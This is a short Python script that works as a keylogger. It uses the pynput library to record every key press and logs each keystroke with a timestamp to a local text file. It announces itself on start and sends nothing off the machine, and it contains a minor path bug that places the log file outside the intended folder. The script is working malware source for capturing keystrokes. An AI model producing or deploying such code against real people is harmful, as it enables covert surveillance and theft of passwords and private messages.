#!/usr/bin/python3
from pynput.keyboard import Key,Listener
import os
import logging

def keypress(key):
    logging.info(str(key))

print("Keylogger Started")
log_dir = os.getcwd()
logging.basicConfig(filename=(os.path.join(log_dir+"Keylogs.txt")),level=logging.DEBUG,format='%(asctime)s: %(message)s')

with Listener(on_press=keypress) as listener:
    listener.join()